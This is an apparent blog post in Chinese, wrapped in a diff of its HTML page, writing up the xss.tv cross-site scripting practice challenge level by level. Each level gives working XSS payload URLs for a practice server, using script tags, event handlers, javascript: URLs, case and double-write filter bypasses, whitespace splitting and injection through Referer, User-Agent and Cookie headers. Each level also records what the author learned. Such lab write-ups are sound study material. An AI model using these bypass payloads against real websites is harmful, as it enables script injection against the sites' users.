@@ -1,0 +1,1146 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="http://test.xss.tv http://47.94.13.75/test/  test on Firefox  54.0 (64-bit)  Level1123456view-source:http://47.94.13.75/test/level1.php?name=test&amp;lt;h2 align=center&amp;gt;欢迎用户test&amp;lt;/h2&amp;gt;直接在文本中输出用户提交">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss.tv挑战赛">
+<meta property="og:url" content="https://findneo.github.io/180405XSSTVChallenge/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="http://test.xss.tv http://47.94.13.75/test/  test on Firefox  54.0 (64-bit)  Level1123456view-source:http://47.94.13.75/test/level1.php?name=test&amp;lt;h2 align=center&amp;gt;欢迎用户test&amp;lt;/h2&amp;gt;直接在文本中输出用户提交">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-01-25T23:21:36.973Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss.tv挑战赛">
+<meta name="twitter:description" content="http://test.xss.tv http://47.94.13.75/test/  test on Firefox  54.0 (64-bit)  Level1123456view-source:http://47.94.13.75/test/level1.php?name=test&amp;lt;h2 align=center&amp;gt;欢迎用户test&amp;lt;/h2&amp;gt;直接在文本中输出用户提交">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findneo.github.io/180405XSSTVChallenge/">
+
+
+
+
+
+  <title>xss.tv挑战赛 | 闲言语</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闲言语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180405XSSTVChallenge/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">xss.tv挑战赛</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-05T23:47:33+08:00">
+                2018-04-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p><a href="http://test.xss.tv" target="_blank" rel="noopener">http://test.xss.tv</a></p>
+<p><a href="http://47.94.13.75/test/" target="_blank" rel="noopener">http://47.94.13.75/test/</a></p>
+</blockquote>
+<p><code>test on Firefox  54.0 (64-bit)</code> </p>
+<h1 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level1.php?name=test</span></span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">直接在文本中输出用户提交的变量</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/47.94.13.75/</span>test/level1.php?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">收获：为HTML body添加标签。</span><br></pre></td></tr></table></figure>
+<h1 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level2.php?keyword=test</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">"test"</span>&gt;</span><br><span class="line">直接在标签属性中用户提交的变量</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level2.php?keyword="&gt;&lt;script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。</span><br></pre></td></tr></table></figure>
+<h1 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level3.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='</span><span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;'</span>&gt;</span><br><span class="line"></span><br><span class="line">两处输出都对双引号、尖括号和&amp;进行了HTML实体编码，但前面的单引号可以被闭合，考虑使用input标签的某些事件执行脚本。</span><br><span class="line">自动聚焦到输入框，打开就弹</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onfocus='alert()' autofocus='</span></span><br><span class="line">点击页面非输入框的任何地方以移开焦点</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword='  autofocus onblur='alert()</span></span><br><span class="line">点击输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onfocus='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword='  onclick='alert()</span></span><br><span class="line">在输入框输入</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' oninput='alert()</span></span><br><span class="line">输入然后点击搜索</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onchange='alert()</span></span><br><span class="line">移动鼠标经过输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onmousemove='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onmouseout='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onmouseover='alert()</span></span><br><span class="line">点击输入框，进行按键操作</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onkeydown='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onkeyup='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onkeypress='alert()</span></span><br><span class="line">双击输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword='  ondblclick='alert()</span></span><br><span class="line"></span><br><span class="line">更多可用事件可以参考这里：https:<span class="comment">//www.w3schools.com/tags/ref_eventattributes.asp</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的单引号并在标签中添加事件。</span><br></pre></td></tr></table></figure>
+<h1 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level4.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"findneo=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，在标签属性值中过滤了尖括号。</span><br><span class="line">把上一题payload的单引号换成双引号应该都可以用</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level4.php?keyword=" onfocus='alert()' autofocus="</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的双引号并在标签中添加事件。</span><br></pre></td></tr></table></figure>
+<h1 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level5.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签属性值没有编码</span><br><span class="line">进一步测试发现query会转成小写，&lt;script，on等敏感词会加下划线</span><br><span class="line">看起来事件和script标签都不好使，可以闭合原来的标签，自己添加标签，然后试着用用刚从书里学到的伪协议</span><br><span class="line">点击findneo就能弹</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level5.php?keyword="&gt;&lt;a href="javascript:alert(1);"&gt;findneo&lt;/a&gt;</span></span><br><span class="line">做一下美化</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level5.php?keyword=" type="hidden"/&gt;&lt;a href="javascript:alert(1);"&gt;aa&lt;/a&gt;&lt;input type="hidden</span></span><br><span class="line">vbscript和dataURI似乎都不能奏效。</span><br><span class="line"></span><br><span class="line">收获：利用JavaScript伪协议。</span><br></pre></td></tr></table></figure>
+<h1 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.94.13.75/test/level6.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line"></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-findneo=&#123;()&#125;/\相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签值属性没有编码</span><br><span class="line"></span><br><span class="line">进一步测试发现&lt;script,on,href都被加下划线了，但是没有做全部转小写的操作，所以可以大小写绕过。</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level6.php?keyword="&gt;&lt;Script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：大小写绕过敏感词检测。</span><br></pre></td></tr></table></figure>
+<h1 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level7.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签值属性没有编码</span><br><span class="line">进一步测试发现on,script,href都被替换为空，但只执行一次，没有递归操作，可以用关键字嵌套来绕过。</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level7.php?keyword="&gt;&lt;soncript&gt;alert()&lt;/soncript&gt;</span></span><br><span class="line"></span><br><span class="line">收获：关键字嵌套（双写）绕过敏感词过滤。</span><br></pre></td></tr></table></figure>
+<h1 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level8.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">"';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;"</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">"';!-&amp;quot&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;友情链接&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">input标签的value属性输出处编码了双引号、尖括号和&amp;；a标签的href属性输出处编码了双引号。</span></span><br><span class="line"><span class="regexp">进一步测试发现数据都被转小写，on,script,href,data等都被加下划线了。</span></span><br><span class="line"><span class="regexp">一番查找资料发现了可以通过JavaScript变换（利用空白符如水平制表符HT，换行符LF，回车键CR来截断关键字）的办法绕过</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/47.94.13.75/</span>test/level8.php?keyword=javas%<span class="number">09</span>cript:alert()</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%0acript:alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%0dcript:alert()</span></span><br><span class="line"></span><br><span class="line">可在http:<span class="comment">//wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</span></span><br><span class="line">页面内搜索“JavaScript变换”看到相关信息。</span><br><span class="line"></span><br><span class="line">收获：空白符（特殊的结束标识符）绕过敏感词检测。</span><br></pre></td></tr></table></figure>
+<h1 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level9.php?keyword=http://';!-"&lt;finDneo&gt;=&#123;()&#125;/\&amp;</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">"http://';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href="http:/</span><span class="regexp">/';!-&amp;quot&lt;findneo&gt;=&#123;()&#125;/</span>\&amp;<span class="string">"&gt;友情链接&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输入数据全部转为小写，且必须协议正确，刚开始以为必须以“http://”开头，后来发现只要含有就可以了。</span></span><br><span class="line"><span class="string">input标签的值编码了双引号、尖括号和&amp;；href处编码了双括号。</span></span><br><span class="line"><span class="string">从上一题稍作变化即可</span></span><br><span class="line"><span class="string">http://47.94.13.75/test/level9.php?keyword=javas%09cript:alert('http://')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">收获：如果要检测URL协议，应该检测协议名是否在字符串的开头。</span></span><br></pre></td></tr></table></figure>
+<h1 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level10.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">只有一个输出点，编码了双引号、尖括号和&amp;。谷歌了很久，都说这几乎是不可能成的。（If angle brackets and double quote characters are escaped, this is enough to prevent XSS in HTML body and double quoted entity value contexts.）</span></span><br><span class="line"><span class="string">无奈之下查了writeup，发现自己观察能力需要提高，显著的hidden就在眼皮底下，竟然一点都没有注意到。</span></span><br><span class="line"><span class="string">有一个隐藏的表单如下：</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">可尝试其参数是否可能被注入</span></span><br><span class="line"><span class="string">访问47.94.13.75/test/level10.php?keyword=asdf&amp;t_link="&amp;t_history="&amp;t_sort="</span></span><br><span class="line"><span class="string">会发现在相应中t_sort是可注入双引号的，于是可以构造链接弹窗。</span></span><br><span class="line"><span class="string">http://47.94.13.75/test/level10.php?t_sort="  autofocus onfocus=alert() type="text</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">收获：注意测试隐藏元素。</span></span><br><span class="line"><span class="string">这道题乍一看有些让人摸不着头脑，但仔细想想觉得这在真实环境中是会发生的。开发者利用隐藏的表单提交数据，然后就默认这些数据是可靠的，于是在忘记或者认为没必要在服务端做校验，这就导致了代码的缺陷。像本题的t_sort键就是个例子，所以如果遇到hidden的元素可以测一测。</span></span><br></pre></td></tr></table></figure>
+<h1 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">test1:view-source:http:<span class="comment">//47.94.13.75/test/level11.php?keyword=&amp;t_link="&lt;xss&gt;&amp;t_history="&lt;xss&gt;&amp;t_sort='&lt;xss&gt;&amp;t_ref="&lt;xss&gt;</span></span><br><span class="line">与上一题类似，表单中多了一个t_ref，但看起来只有t_sort可以注入。</span><br><span class="line">test2:view-source:http:<span class="comment">//47.94.13.75/test/level11.php?t_sort=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">得到：&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">对双引号、尖括号和&amp;进行了编码。input标签中value属性的双引号难以逃逸。</span><br><span class="line">考虑莫名多出来的t_ref,猜测服务端是取请求头的referer值来返回，于是截包添加请求头。</span><br><span class="line">referer: <span class="string">" autofocus onfocus=alert() type="</span>text</span><br><span class="line"></span><br><span class="line">收获：寻找一些可能的、可控的输入！</span><br></pre></td></tr></table></figure>
+<h1 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level12.php?keyword=findneo</span></span><br><span class="line">与上一题相似，这题修改的是UA。</span><br><span class="line"></span><br><span class="line">收获：User-Agent（以及HTTP请求头的其他部分）也是可控的输入。</span><br></pre></td></tr></table></figure>
+<h1 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level13.php?keyword=findneo</span></span><br><span class="line">与前面类似，修改Cookie。</span><br><span class="line"></span><br><span class="line">收获：Cookie（以及HTTP请求头的其他部分）也是可控的输入。</span><br></pre></td></tr></table></figure>
+<h1 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.94.13.75/test/level16.php</span></span><br><span class="line">测试发现编码了/和空格</span><br><span class="line">将后面内容注释掉，使用无需闭合的标签，使用特殊空白符代替空格即可</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level16.php?keyword=findneo&lt;img%0asrc=''%0aonerror=alert(1)&gt;&lt;!--</span></span><br><span class="line"></span><br><span class="line">收获：注释符，空白符</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/180404HuaweiExam/" rel="next" title="华为2018年校园招聘软件题">
+                <i class="fa fa-chevron-left"></i> 华为2018年校园招聘软件题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/180406BugkuWriteup/" rel="prev" title="Bugku Writeup">
+                Bugku Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
